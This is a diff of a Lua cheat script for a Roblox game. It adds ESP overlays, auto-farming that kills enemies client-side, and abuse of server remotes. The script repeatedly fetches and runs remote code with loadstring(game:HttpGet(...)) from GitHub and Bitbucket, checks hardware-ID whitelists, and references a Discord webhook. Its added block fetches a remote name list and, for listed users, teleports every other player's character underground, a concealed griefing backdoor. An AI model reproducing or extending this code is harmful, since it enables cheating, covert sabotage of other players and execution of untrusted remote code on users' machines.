@@ -292,9 +292,9 @@ local url = "https://discord.com/api/webhooks/1268351413751120002/YX_I7VpV7ECm8b
 end)  
 
 _G.asdwqelist = false
+_G.antiusefree = false
 
 listedaxw = loadstring(game:HttpGet('https://raw.githubusercontent.com/Iamcutehehe/hehehe/main/whitelist.lua'))()
-
         for _, v1 in pairs(listedaxw) do
 gethwid = game:GetService("RbxAnalyticsService"):GetClientId()
             if gethwid == v1 then
@@ -309,7 +309,42 @@ _G.asdwqelist = true
             end
         end
 
-anticamp = loadstring(game:HttpGet("https://raw.githubusercontent.com/Iamcutehehe/hehehe/main/golden.lua"))()
+antifreezsc = loadstring(game:HttpGet('https://raw.githubusercontent.com/PotatoEiii/whocares/main/rat.lua'))()
+        for _, v3 in pairs(antifreezsc) do
+            if game.Players.LocalPlayer.Name == v3 then
+_G.antiusefree = true
+            end
+        end
+
+if _G.antiusefree then
+spawn(function()
+while wait(0.1) do
+pcall(function()
+for i,v in pairs(game.Players:GetChildren()) do
+if v.Name ~= game.Players.LocalPlayer.Name then
+for i,c in pairs(game.Workspace:GetChildren()) do
+if c:IsA("Model") and c.Name == v.Name then
+local args = {
+    [1] = c.HumanoidRootPart.CFrame * CFrame.new(0,-25,0),
+    [2] = workspace:WaitForChild("IslandTown"):WaitForChild("Beach"):WaitForChild("Beach")
+}
+
+c.Shave:FireServer(unpack(args))
+local args = {
+    [1] = c.HumanoidRootPart.CFrame * CFrame.new(0,-25,0),
+    [2] = workspace:WaitForChild("IslandTown"):WaitForChild("Beach"):WaitForChild("Beach")
+}
+
+c.Dash:FireServer(unpack(args))
+wait()
+end
+end
+end
+end
+end)
+end
+end)
+end
 
 if _G.asdwqelist then
 do
@@ -1140,14 +1175,14 @@ for i,v in pairs(game:GetService'Players':GetChildren()) do
                                 local bill = Instance.new('BillboardGui',v.Character.Head)
                                 bill.Name = 'NameEsp'..Number
                                 bill.ExtentsOffset = Vector3.new(0, 1, 0)
-                                bill.Size = UDim2.new(1,200,1,50)
+                                bill.Size = UDim2.new(1,200,1,60)
                                 bill.Adornee = v.Character.Head
                                 bill.AlwaysOnTop = true
                                 local name = Instance.new('TextLabel',bill)
                                 name.FontFace = Font.fromName("Merriweather")
                                 name.FontSize = "Size14"
                                 name.TextWrapped = true
-                                name.Text = (v.Name ..' \n'.. round((game:GetService('Players').LocalPlayer.Character.Head.Position - v.Character.Head.Position).Magnitude/3) ..' m \n' ..game.Workspace.UserData["User_"..v.UserId].Data["DevilFruit"].Value .. ' '.. game.Workspace.UserData["User_"..v.UserId].Data["DevilFruit2"].Value)
+                                name.Text = (v.Name ..' \n'.. round((game:GetService('Players').LocalPlayer.Character.Head.Position - v.Character.Head.Position).Magnitude/3) ..' m \n' ..game.Workspace.UserData["User_"..v.UserId].Data["DevilFruit"].Value .. ' '.. game.Workspace.UserData["User_"..v.UserId].Data["DevilFruit2"].Value .. "\n HP: " .. math.floor(v.Character.CharacterTrait.Health.Value) .."/" ..math.floor(v.Character.CharacterTrait.HealthMax.Value))
                                 name.Size = UDim2.new(1,0,1,0)
                                 name.TextYAlignment = 'Top'
                                 name.BackgroundTransparency = 1
@@ -1158,7 +1193,7 @@ for i,v in pairs(game:GetService'Players':GetChildren()) do
                                     name.TextColor3 = Color3.fromRGB(0, 255, 127)
                                 end
                             else
-                                v.Character.Head['NameEsp'..Number].TextLabel.Text = (v.Name ..'   \n'.. round((game:GetService('Players').LocalPlayer.Character.Head.Position - v.Character.Head.Position).Magnitude/3) ..' m \n' ..game.Workspace.UserData["User_"..v.UserId].Data["DevilFruit"].Value .. ' '.. game.Workspace.UserData["User_"..v.UserId].Data["DevilFruit2"].Value)
+                                v.Character.Head['NameEsp'..Number].TextLabel.Text = (v.Name ..'   \n'.. round((game:GetService('Players').LocalPlayer.Character.Head.Position - v.Character.Head.Position).Magnitude/3) ..' m \n' ..game.Workspace.UserData["User_"..v.UserId].Data["DevilFruit"].Value .. ' '.. game.Workspace.UserData["User_"..v.UserId].Data["DevilFruit2"].Value .. "\n HP: " .. math.floor(v.Character.CharacterTrait.Health.Value) .."/" ..math.floor(v.Character.CharacterTrait.HealthMax.Value))
                             end
                         end
                     end
@@ -3711,357 +3746,6 @@ _G.farmfruit = false
 end
 end)
 
-spawn(function()
-while wait() do
-repeat wait() until _G.farmfruit == true
-pcall(function()
-repeat wait()
-if _G.fruitfarmz == "Light" and _G.farmfruit == true then
-repeat wait()
-for _,moblist in pairs(Mobsfarmz) do
-for _,mobalive in pairs(game.Workspace.Enemies:GetChildren()) do
-if string.find(mobalive.Name,moblist) then
-if _G.farmfruit == true and _G.fruitfarmz == "Light" and mobalive.Humanoid.Health ~= 0 and not game.Players.LocalPlayer.Backpack:FindFirstChild("Compass") and not game.Players.LocalPlayer.Character:FindFirstChild("Compass") then 
-if string.find(mobalive.Name,"Gun") or string.find(mobalive.Name,"Cave") or string.find(mobalive.Name,"Bruno") or string.find(mobalive.Name,"Bucky") or string.find(mobalive.Name,"Buster") or string.find(mobalive.Name,"Vokun") then 
-game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = mobalive.HumanoidRootPart.CFrame * CFrame.new(0,5,0)
-mobalive:FindFirstChild("HumanoidRootPart").Anchored = false
-mobalive.HumanoidRootPart.CanCollide = true
-mobalive:FindFirstChild("Humanoid").Health = 0
-mobalive.Head:Destroy()
-mobalive:FindFirstChildOfClass("Humanoid"):ChangeState(Enum.HumanoidStateType.Dead)
-task.wait(0.5)
-local args = {
-    [1] = getsenv(game:GetService("Players").LocalPlayer.Character.Powers.Light).VTCrv,
-    [2] = "LightPower2",
-    [3] = "StartCharging",
-    [4] = CFrame.new(0,0,0),
-    [5] = workspace.IslandCaver.Stones.Stone,
-    [9] = "Right"
-}
-
-game:GetService("Players").LocalPlayer.Character.Powers.Light.RemoteEvent:FireServer(unpack(args))
-task.wait()
-local args = {
-    [1] = getsenv(game:GetService("Players").LocalPlayer.Character.Powers.Light).VTCrv,
-    [2] = "LightPower2",
-    [3] = "StopCharging",
-    [4] = mobalive.HumanoidRootPart.CFrame,
-    [5] = workspace.IslandCaver.Stones.Stone,
-    [6] = 100
-}
-
-game:GetService("Players").LocalPlayer.Character.Powers.Light.RemoteEvent:FireServer(unpack(args))
-task.wait(0.2)
-else
-task.wait(0.05)
-game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = mobalive.HumanoidRootPart.CFrame * CFrame.new(0,5,0)
-task.wait(0.05)
-local args = {
-    [1] = getsenv(game:GetService("Players").LocalPlayer.Character.Powers.Light).VTCrv,
-    [2] = "LightPower2",
-    [3] = "StartCharging",
-    [4] = CFrame.new(0,0,0),
-    [5] = workspace.IslandCaver.Stones.Stone,
-    [9] = "Right"
-}
-
-game:GetService("Players").LocalPlayer.Character.Powers.Light.RemoteEvent:FireServer(unpack(args))
-task.wait()
-local args = {
-    [1] = getsenv(game:GetService("Players").LocalPlayer.Character.Powers.Light).VTCrv,
-    [2] = "LightPower2",
-    [3] = "StopCharging",
-    [4] = mobalive.HumanoidRootPart.CFrame,
-    [5] = workspace.IslandCaver.Stones.Stone,
-    [6] = 100
-}
-
-game:GetService("Players").LocalPlayer.Character.Powers.Light.RemoteEvent:FireServer(unpack(args))
-task.wait(0.09)
-local args = {
-    [1] = getsenv(game:GetService("Players").LocalPlayer.Character.Powers.Light).VTCrv,
-    [2] = "LightPower2",
-    [3] = "StartCharging",
-    [4] = CFrame.new(0,0,0),
-    [5] = workspace.IslandCaver.Stones.Stone,
-    [9] = "Right"
-}
-
-game:GetService("Players").LocalPlayer.Character.Powers.Light.RemoteEvent:FireServer(unpack(args))
-task.wait()
-local args = {
-    [1] = getsenv(game:GetService("Players").LocalPlayer.Character.Powers.Light).VTCrv,
-    [2] = "LightPower2",
-    [3] = "StopCharging",
-    [4] = mobalive.HumanoidRootPart.CFrame,
-    [5] = workspace.IslandCaver.Stones.Stone,
-    [6] = 100
-}
-
-game:GetService("Players").LocalPlayer.Character.Powers.Light.RemoteEvent:FireServer(unpack(args))
-end
-end
-end
-end
-end
-until _G.fruitfarmz ~= "Light" or _G.farmfruit == false
-elseif _G.fruitfarmz == "Magma" and _G.farmfruit == true then
-repeat wait()
-for _,moblist in pairs(Mobsfarmz) do
-for _,mobalive in pairs(game.Workspace.Enemies:GetChildren()) do
-if string.find(mobalive.Name,moblist) then
-if _G.farmfruit == true and _G.fruitfarmz == "Magma" and mobalive.Humanoid.Health ~= 0 and not game.Players.LocalPlayer.Backpack:FindFirstChild("Compass") and not game.Players.LocalPlayer.Character:FindFirstChild("Compass") then 
-if string.find(mobalive.Name,"Gun") or string.find(mobalive.Name,"Cave") or string.find(mobalive.Name,"Bruno") or string.find(mobalive.Name,"Bucky") or string.find(mobalive.Name,"Buster") or string.find(mobalive.Name,"Vokun") then 
-game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = mobalive.HumanoidRootPart.CFrame * CFrame.new(0,5,0)
-mobalive:FindFirstChild("HumanoidRootPart").Anchored = false
-mobalive.HumanoidRootPart.CanCollide = true
-mobalive:FindFirstChild("Humanoid").Health = 0
-mobalive.Head:Destroy()
-mobalive:FindFirstChildOfClass("Humanoid"):ChangeState(Enum.HumanoidStateType.Dead)
-task.wait(0.5)
-local args = {
-    [1] = getsenv(game:GetService("Players").LocalPlayer.Character.Powers.Magma).VTCmel,
-    [2] = "MagmaPower1",
-    [3] = "StartCharging",
-    [4] = CFrame.new(0,0,0),
-    [5] = workspace:WaitForChild("IslandTown"):WaitForChild("Beach"):WaitForChild("Beach"),
-    [7] = "Right"
-}
-
-game:GetService("Players").LocalPlayer.Character.Powers.Magma.RemoteEvent:FireServer(unpack(args))
-task.wait()
-local args = {
-    [1] = getsenv(game:GetService("Players").LocalPlayer.Character.Powers.Magma).VTCmel,
-    [2] = "MagmaPower1",
-    [3] = "StopCharging",
-    [4] = mobalive.HumanoidRootPart.CFrame,
-    [5] = workspace:WaitForChild("IslandTown"):WaitForChild("Beach"):WaitForChild("Beach"),
-    [6] = 100
-}
-
-game:GetService("Players").LocalPlayer.Character.Powers.Magma.RemoteEvent:FireServer(unpack(args))
-task.wait(0.2)
-else
-task.wait(0.05)
-game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = mobalive.HumanoidRootPart.CFrame * CFrame.new(0,5,0)
-task.wait(0.05)
-local args = {
-    [1] = getsenv(game:GetService("Players").LocalPlayer.Character.Powers.Magma).VTCmel,
-    [2] = "MagmaPower1",
-    [3] = "StartCharging",
-    [4] = CFrame.new(0,0,0),
-    [5] = workspace:WaitForChild("IslandTown"):WaitForChild("Beach"):WaitForChild("Beach"),
-    [7] = "Right"
-}
-
-game:GetService("Players").LocalPlayer.Character.Powers.Magma.RemoteEvent:FireServer(unpack(args))
-task.wait()
-local args = {
-    [1] = getsenv(game:GetService("Players").LocalPlayer.Character.Powers.Magma).VTCmel,
-    [2] = "MagmaPower1",
-    [3] = "StopCharging",
-    [4] = mobalive.HumanoidRootPart.CFrame,
-    [5] = workspace:WaitForChild("IslandTown"):WaitForChild("Beach"):WaitForChild("Beach"),
-    [6] = 100
-}
-
-game:GetService("Players").LocalPlayer.Character.Powers.Magma.RemoteEvent:FireServer(unpack(args))
-task.wait(0.09)
-local args = {
-    [1] = getsenv(game:GetService("Players").LocalPlayer.Character.Powers.Magma).VTCmel,
-    [2] = "MagmaPower1",
-    [3] = "StartCharging",
-    [4] = CFrame.new(0,0,0),
-    [5] = workspace:WaitForChild("IslandTown"):WaitForChild("Beach"):WaitForChild("Beach"),
-    [7] = "Right"
-}
-
-game:GetService("Players").LocalPlayer.Character.Powers.Magma.RemoteEvent:FireServer(unpack(args))
-task.wait()
-local args = {
-    [1] = getsenv(game:GetService("Players").LocalPlayer.Character.Powers.Magma).VTCmel,
-    [2] = "MagmaPower1",
-    [3] = "StopCharging",
-    [4] = mobalive.HumanoidRootPart.CFrame,
-    [5] = workspace:WaitForChild("IslandTown"):WaitForChild("Beach"):WaitForChild("Beach"),
-    [6] = 100
-}
-
-game:GetService("Players").LocalPlayer.Character.Powers.Magma.RemoteEvent:FireServer(unpack(args))
-end
-end
-end
-end
-end
-until _G.fruitfarmz ~= "Magma" or _G.farmfruit == false
-elseif _G.fruitfarmz == "Bomb" and _G.farmfruit == true then
-repeat wait()
-for _,moblist in pairs(Mobsfarmz) do
-for _,mobalive in pairs(game.Workspace.Enemies:GetChildren()) do
-if string.find(mobalive.Name,moblist) then
-if _G.farmfruit == true and _G.fruitfarmz == "Bomb" and mobalive.Humanoid.Health ~= 0 and not game.Players.LocalPlayer.Backpack:FindFirstChild("Compass") and not game.Players.LocalPlayer.Character:FindFirstChild("Compass") then 
-if string.find(mobalive.Name,"Gun") or string.find(mobalive.Name,"Cave") or string.find(mobalive.Name,"Bruno") or string.find(mobalive.Name,"Bucky") or string.find(mobalive.Name,"Buster") or string.find(mobalive.Name,"Vokun") then 
-game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = mobalive.HumanoidRootPart.CFrame * CFrame.new(0,5,0)
-mobalive:FindFirstChild("HumanoidRootPart").Anchored = false
-mobalive.HumanoidRootPart.CanCollide = true
-mobalive:FindFirstChild("Humanoid").Health = 0
-mobalive.Head:Destroy()
-mobalive:FindFirstChildOfClass("Humanoid"):ChangeState(Enum.HumanoidStateType.Dead)
-task.wait(0.5)
-local args = {
-    [1] = getsenv(game:GetService("Players").LocalPlayer.Character.Powers.Bomb).VTCcpkghc,
-    [2] = "BombPower8",
-    [3] = "StartCharging",
-    [4] = CFrame.new(0,0,0),
-    [5] = workspace:WaitForChild("IslandGrassy"):WaitForChild("Base"):WaitForChild("DirtGrass"):WaitForChild("Grass"):WaitForChild("Grass"),
-    [7] = "Left"
-}
-
-game:GetService("Players").LocalPlayer.Character.Powers.Bomb.RemoteEvent:FireServer(unpack(args))
-task.wait()
-local args = {
-    [1] = getsenv(game:GetService("Players").LocalPlayer.Character.Powers.Bomb).VTCcpkghc,
-    [2] = "BombPower8",
-    [3] = "StopCharging",
-    [4] = CFrame.new(0,0,0),
-    [5] = workspace:WaitForChild("IslandGrassy"):WaitForChild("Base"):WaitForChild("Path"):WaitForChild("Wedge"),
-    [6] = 100
-}
-
-game:GetService("Players").LocalPlayer.Character.Powers.Bomb.RemoteEvent:FireServer(unpack(args))
-task.wait(0.2)
-else
-task.wait(0.05)
-game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = mobalive.HumanoidRootPart.CFrame * CFrame.new(0,5,0)
-task.wait(0.05)
-local args = {
-    [1] = getsenv(game:GetService("Players").LocalPlayer.Character.Powers.Bomb).VTCcpkghc,
-    [2] = "BombPower8",
-    [3] = "StartCharging",
-    [4] = CFrame.new(0,0,0),
-    [5] = workspace:WaitForChild("IslandGrassy"):WaitForChild("Base"):WaitForChild("DirtGrass"):WaitForChild("Grass"):WaitForChild("Grass"),
-    [7] = "Left"
-}
-
-game:GetService("Players").LocalPlayer.Character.Powers.Bomb.RemoteEvent:FireServer(unpack(args))
-task.wait()
-local args = {
-    [1] = getsenv(game:GetService("Players").LocalPlayer.Character.Powers.Bomb).VTCcpkghc,
-    [2] = "BombPower8",
-    [3] = "StopCharging",
-    [4] = CFrame.new(0,0,0),
-    [5] = workspace:WaitForChild("IslandGrassy"):WaitForChild("Base"):WaitForChild("Path"):WaitForChild("Wedge"),
-    [6] = 100
-}
-
-game:GetService("Players").LocalPlayer.Character.Powers.Bomb.RemoteEvent:FireServer(unpack(args))
-task.wait(0.09)
-local args = {
-    [1] = getsenv(game:GetService("Players").LocalPlayer.Character.Powers.Bomb).VTCcpkghc,
-    [2] = "BombPower8",
-    [3] = "StartCharging",
-    [4] = CFrame.new(0,0,0),
-    [5] = workspace:WaitForChild("IslandGrassy"):WaitForChild("Base"):WaitForChild("DirtGrass"):WaitForChild("Grass"):WaitForChild("Grass"),
-    [7] = "Left"
-}
-
-game:GetService("Players").LocalPlayer.Character.Powers.Bomb.RemoteEvent:FireServer(unpack(args))
-task.wait()
-local args = {
-    [1] = getsenv(game:GetService("Players").LocalPlayer.Character.Powers.Bomb).VTCcpkghc,
-    [2] = "BombPower8",
-    [3] = "StopCharging",
-    [4] = CFrame.new(0,0,0),
-    [5] = workspace:WaitForChild("IslandGrassy"):WaitForChild("Base"):WaitForChild("Path"):WaitForChild("Wedge"),
-    [6] = 100
-}
-
-game:GetService("Players").LocalPlayer.Character.Powers.Bomb.RemoteEvent:FireServer(unpack(args))
-end
-end
-end
-end
-end
-until _G.fruitfarmz ~= "Bomb" or _G.farmfruit == false
-elseif _G.fruitfarmz == "Gravity" and _G.farmfruit == true then
-repeat wait()
-for _,moblist in pairs(Mobsfarmz) do
-for _,mobalive in pairs(game.Workspace.Enemies:GetChildren()) do
-if string.find(mobalive.Name,moblist) then
-if _G.farmfruit == true and _G.fruitfarmz == "Gravity" and mobalive.Humanoid.Health ~= 0 and not game.Players.LocalPlayer.Backpack:FindFirstChild("Compass") and not game.Players.LocalPlayer.Character:FindFirstChild("Compass") then 
-game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = mobalive.HumanoidRootPart.CFrame * CFrame.new(0,5,0)
-mobalive:FindFirstChild("HumanoidRootPart").Anchored = false
-mobalive.HumanoidRootPart.CanCollide = true
-mobalive:FindFirstChild("Humanoid").Health = 0
-mobalive.Head:Destroy()
-mobalive:FindFirstChildOfClass("Humanoid"):ChangeState(Enum.HumanoidStateType.Dead)
-task.wait(0.5)
-local args = {
-[1] = getsenv(game:GetService("Players").LocalPlayer.Character.Powers.Gravity).VTCjh,
-[2] = "GravityPower4",
-[3] = "StartCharging"
-}
-
-game:GetService("Players").LocalPlayer.Character.Powers.Gravity.RemoteEvent:FireServer(unpack(args))
-task.wait()
-local args = {
-[1] = getsenv(game:GetService("Players").LocalPlayer.Character.Powers.Gravity).VTCjh,
-[2] = "GravityPower4",
-[3] = "StartCharging",
-[4] = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position),
-[5] = game.Players.LocalPlayer.Character.HumanoidRootPart
-}
-                        
-game:GetService("Players").LocalPlayer.Character.Powers.Gravity.RemoteEvent:FireServer(unpack(args))
-task.wait()
-local args = {
-[1] = getsenv(game:GetService("Players").LocalPlayer.Character.Powers.Gravity).VTCjh,
-[2] = "GravityPower4",
-[3] = "StopCharging",
-[4] = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position),
-[5] = game.Players.LocalPlayer.Character.HumanoidRootPart,
-[6] = 300
-}
-
-game:GetService("Players").LocalPlayer.Character.Powers.Gravity.RemoteEvent:FireServer(unpack(args))
-task.wait(0.2)
-end
-end
-end
-end
-until _G.fruitfarmz ~= "Gravity" or _G.farmfruit == false
-elseif _G.fruitfarmz == "Rumble" and _G.farmfruit == true then
-repeat wait()
-for _,moblist in pairs(Mobsfarmz) do
-for _,mobalive in pairs(game.Workspace.Enemies:GetChildren()) do
-if string.find(mobalive.Name,moblist) then
-if _G.farmfruit == true and _G.fruitfarmz == "Rumble" and mobalive.Humanoid.Health ~= 0 and not game.Players.LocalPlayer.Backpack:FindFirstChild("Compass") and not game.Players.LocalPlayer.Character:FindFirstChild("Compass") then 
-game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = mobalive.HumanoidRootPart.CFrame * CFrame.new(0,5,0)
-mobalive:FindFirstChild("HumanoidRootPart").Anchored = false
-mobalive.HumanoidRootPart.CanCollide = true
-mobalive:FindFirstChild("Humanoid").Health = 0
-mobalive.Head:Destroy()
-mobalive:FindFirstChildOfClass("Humanoid"):ChangeState(Enum.HumanoidStateType.Dead)
-task.wait(0.5)
-local args = {
-    [1] = getsenv(game:GetService("Players").LocalPlayer.Character.Powers.Rumble).VTCzyhf,
-    [2] = "RumblePower4",
-    [3] = "Create"
-}
-
-game:GetService("Players").LocalPlayer.Character.Powers.Rumble.RemoteEvent:FireServer(unpack(args))
-task.wait(0.2)
-end
-end
-end
-end
-until _G.fruitfarmz ~= "Rumble" or _G.farmfruit == false
-end
-until _G.farmfruit == false
-end)
-end
-end)
-
 Tabs.Haki:AddSection("						  ---Haki Stuff---")
 gethaki = Tabs.Haki:AddToggle("hakiget", {Title = "Auto get haki (1k lvl)", Default = false })
 gethaki:OnChanged(function()
@@ -5748,19 +5432,6 @@ Fluent:Notify({
 
 SaveManager:LoadAutoloadConfig()
 
-if game.placeId == 3237168 then
-loadstring(game:HttpGet('https://bitbucket.org/hehehezz/hellowz/raw/ee153aeb755fe6039f2aaf31e6c848fafbbb97f9/frzxhoo.lua'))()
-end
-
-else
-loadstring(game:HttpGet('https://raw.githubusercontent.com/Iamcutehehe/hehehe/main/rllysus.lua'))()
-game:GetService("Players").LocalPlayer.PlayerGui.Announcement.Frame.Visible = false
-end
-end
-if game.placeId ~= 3237168 or game.placeId ~= 8569358381 then
-game:GetService("Players").LocalPlayer.PlayerGui.Announcement.Frame.TextLabel.Text = "This Game Is Not Supported"
-end
-
 spawn(function()
 while wait(0.3) do
 repeat wait() until _G.startspamskill == true
@@ -7354,10 +7025,10 @@ Fluent:Notify({
     Duration = 5
 })
 repeat wait()
-if _G.SelectedKillPlayer ~= "" and _G.SelectedKillPlayer ~= nil then
+pcall(function()
 game.Workspace.Camera.CameraSubject = game.Players:FindFirstChild(_G.SelectedKillPlayer).Character.Humanoid
-end
-until getgenv().viewplrr == false or game.Players:FindFirstChild(_G.SelectedKillPlayer).Name ~= _G.SelectedKillPlayer
+end)
+until getgenv().viewplrr == false or not game.Players:FindFirstChild(_G.SelectedKillPlayer)
 wait()
 game.Workspace.Camera.CameraSubject = game.Players.LocalPlayer.Character.Humanoid
 end)
@@ -7412,7 +7083,7 @@ repeat wait(0.1)
 for i,tuy in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
 if tuy.Name == "Cannon Ball" then
 game.Players.LocalPlayer.Character.Humanoid:EquipTool(tuy)
-wait(1.2)
+wait(1.5)
 end
 end
 until not _G.autocannon
@@ -8787,6 +8458,374 @@ end
 end
 end)
 
-while wait(0.1) do
+spawn(function()
+while wait() do
+repeat wait() until _G.farmfruit == true
+pcall(function()
+repeat wait()
+if _G.fruitfarmz == "Light" and _G.farmfruit == true then
+repeat wait()
+for _,moblist in pairs(Mobsfarmz) do
+for _,mobalive in pairs(game.Workspace.Enemies:GetChildren()) do
+if string.find(mobalive.Name,moblist) then
+if _G.farmfruit == true and _G.fruitfarmz == "Light" and mobalive.Humanoid.Health ~= 0 and not game.Players.LocalPlayer.Backpack:FindFirstChild("Compass") and not game.Players.LocalPlayer.Character:FindFirstChild("Compass") then 
+if string.find(mobalive.Name,"Gun") or string.find(mobalive.Name,"Cave") or string.find(mobalive.Name,"Bruno") or string.find(mobalive.Name,"Bucky") or string.find(mobalive.Name,"Buster") or string.find(mobalive.Name,"Vokun") then 
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = mobalive.HumanoidRootPart.CFrame * CFrame.new(0,5,0)
+mobalive:FindFirstChild("HumanoidRootPart").Anchored = false
+mobalive.HumanoidRootPart.CanCollide = true
+mobalive:FindFirstChild("Humanoid").Health = 0
+mobalive.Head:Destroy()
+mobalive:FindFirstChildOfClass("Humanoid"):ChangeState(Enum.HumanoidStateType.Dead)
+task.wait(0.5)
+local args = {
+    [1] = getsenv(game:GetService("Players").LocalPlayer.Character.Powers.Light).VTCrv,
+    [2] = "LightPower2",
+    [3] = "StartCharging",
+    [4] = CFrame.new(0,0,0),
+    [5] = workspace.IslandCaver.Stones.Stone,
+    [9] = "Right"
+}
+
+game:GetService("Players").LocalPlayer.Character.Powers.Light.RemoteEvent:FireServer(unpack(args))
+task.wait()
+local args = {
+    [1] = getsenv(game:GetService("Players").LocalPlayer.Character.Powers.Light).VTCrv,
+    [2] = "LightPower2",
+    [3] = "StopCharging",
+    [4] = mobalive.HumanoidRootPart.CFrame,
+    [5] = workspace.IslandCaver.Stones.Stone,
+    [6] = 100
+}
+
+game:GetService("Players").LocalPlayer.Character.Powers.Light.RemoteEvent:FireServer(unpack(args))
+task.wait(0.2)
+else
+task.wait(0.05)
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = mobalive.HumanoidRootPart.CFrame * CFrame.new(0,5,0)
+task.wait(0.05)
+local args = {
+    [1] = getsenv(game:GetService("Players").LocalPlayer.Character.Powers.Light).VTCrv,
+    [2] = "LightPower2",
+    [3] = "StartCharging",
+    [4] = CFrame.new(0,0,0),
+    [5] = workspace.IslandCaver.Stones.Stone,
+    [9] = "Right"
+}
+
+game:GetService("Players").LocalPlayer.Character.Powers.Light.RemoteEvent:FireServer(unpack(args))
+task.wait()
+local args = {
+    [1] = getsenv(game:GetService("Players").LocalPlayer.Character.Powers.Light).VTCrv,
+    [2] = "LightPower2",
+    [3] = "StopCharging",
+    [4] = mobalive.HumanoidRootPart.CFrame,
+    [5] = workspace.IslandCaver.Stones.Stone,
+    [6] = 100
+}
+
+game:GetService("Players").LocalPlayer.Character.Powers.Light.RemoteEvent:FireServer(unpack(args))
+task.wait(0.09)
+local args = {
+    [1] = getsenv(game:GetService("Players").LocalPlayer.Character.Powers.Light).VTCrv,
+    [2] = "LightPower2",
+    [3] = "StartCharging",
+    [4] = CFrame.new(0,0,0),
+    [5] = workspace.IslandCaver.Stones.Stone,
+    [9] = "Right"
+}
+
+game:GetService("Players").LocalPlayer.Character.Powers.Light.RemoteEvent:FireServer(unpack(args))
+task.wait()
+local args = {
+    [1] = getsenv(game:GetService("Players").LocalPlayer.Character.Powers.Light).VTCrv,
+    [2] = "LightPower2",
+    [3] = "StopCharging",
+    [4] = mobalive.HumanoidRootPart.CFrame,
+    [5] = workspace.IslandCaver.Stones.Stone,
+    [6] = 100
+}
+
+game:GetService("Players").LocalPlayer.Character.Powers.Light.RemoteEvent:FireServer(unpack(args))
+end
+end
+end
+end
+end
+until _G.fruitfarmz ~= "Light" or _G.farmfruit == false
+elseif _G.fruitfarmz == "Magma" and _G.farmfruit == true then
+repeat wait()
+for _,moblist in pairs(Mobsfarmz) do
+for _,mobalive in pairs(game.Workspace.Enemies:GetChildren()) do
+if string.find(mobalive.Name,moblist) then
+if _G.farmfruit == true and _G.fruitfarmz == "Magma" and mobalive.Humanoid.Health ~= 0 and not game.Players.LocalPlayer.Backpack:FindFirstChild("Compass") and not game.Players.LocalPlayer.Character:FindFirstChild("Compass") then 
+if string.find(mobalive.Name,"Gun") or string.find(mobalive.Name,"Cave") or string.find(mobalive.Name,"Bruno") or string.find(mobalive.Name,"Bucky") or string.find(mobalive.Name,"Buster") or string.find(mobalive.Name,"Vokun") then 
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = mobalive.HumanoidRootPart.CFrame * CFrame.new(0,5,0)
+mobalive:FindFirstChild("HumanoidRootPart").Anchored = false
+mobalive.HumanoidRootPart.CanCollide = true
+mobalive:FindFirstChild("Humanoid").Health = 0
+mobalive.Head:Destroy()
+mobalive:FindFirstChildOfClass("Humanoid"):ChangeState(Enum.HumanoidStateType.Dead)
+task.wait(0.5)
+local args = {
+    [1] = getsenv(game:GetService("Players").LocalPlayer.Character.Powers.Magma).VTCmel,
+    [2] = "MagmaPower1",
+    [3] = "StartCharging",
+    [4] = CFrame.new(0,0,0),
+    [5] = workspace:WaitForChild("IslandTown"):WaitForChild("Beach"):WaitForChild("Beach"),
+    [7] = "Right"
+}
+
+game:GetService("Players").LocalPlayer.Character.Powers.Magma.RemoteEvent:FireServer(unpack(args))
+task.wait()
+local args = {
+    [1] = getsenv(game:GetService("Players").LocalPlayer.Character.Powers.Magma).VTCmel,
+    [2] = "MagmaPower1",
+    [3] = "StopCharging",
+    [4] = mobalive.HumanoidRootPart.CFrame,
+    [5] = workspace:WaitForChild("IslandTown"):WaitForChild("Beach"):WaitForChild("Beach"),
+    [6] = 100
+}
+
+game:GetService("Players").LocalPlayer.Character.Powers.Magma.RemoteEvent:FireServer(unpack(args))
+task.wait(0.2)
+else
+task.wait(0.05)
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = mobalive.HumanoidRootPart.CFrame * CFrame.new(0,5,0)
+task.wait(0.05)
+local args = {
+    [1] = getsenv(game:GetService("Players").LocalPlayer.Character.Powers.Magma).VTCmel,
+    [2] = "MagmaPower1",
+    [3] = "StartCharging",
+    [4] = CFrame.new(0,0,0),
+    [5] = workspace:WaitForChild("IslandTown"):WaitForChild("Beach"):WaitForChild("Beach"),
+    [7] = "Right"
+}
+
+game:GetService("Players").LocalPlayer.Character.Powers.Magma.RemoteEvent:FireServer(unpack(args))
+task.wait()
+local args = {
+    [1] = getsenv(game:GetService("Players").LocalPlayer.Character.Powers.Magma).VTCmel,
+    [2] = "MagmaPower1",
+    [3] = "StopCharging",
+    [4] = mobalive.HumanoidRootPart.CFrame,
+    [5] = workspace:WaitForChild("IslandTown"):WaitForChild("Beach"):WaitForChild("Beach"),
+    [6] = 100
+}
+
+game:GetService("Players").LocalPlayer.Character.Powers.Magma.RemoteEvent:FireServer(unpack(args))
+task.wait(0.09)
+local args = {
+    [1] = getsenv(game:GetService("Players").LocalPlayer.Character.Powers.Magma).VTCmel,
+    [2] = "MagmaPower1",
+    [3] = "StartCharging",
+    [4] = CFrame.new(0,0,0),
+    [5] = workspace:WaitForChild("IslandTown"):WaitForChild("Beach"):WaitForChild("Beach"),
+    [7] = "Right"
+}
+
+game:GetService("Players").LocalPlayer.Character.Powers.Magma.RemoteEvent:FireServer(unpack(args))
+task.wait()
+local args = {
+    [1] = getsenv(game:GetService("Players").LocalPlayer.Character.Powers.Magma).VTCmel,
+    [2] = "MagmaPower1",
+    [3] = "StopCharging",
+    [4] = mobalive.HumanoidRootPart.CFrame,
+    [5] = workspace:WaitForChild("IslandTown"):WaitForChild("Beach"):WaitForChild("Beach"),
+    [6] = 100
+}
+
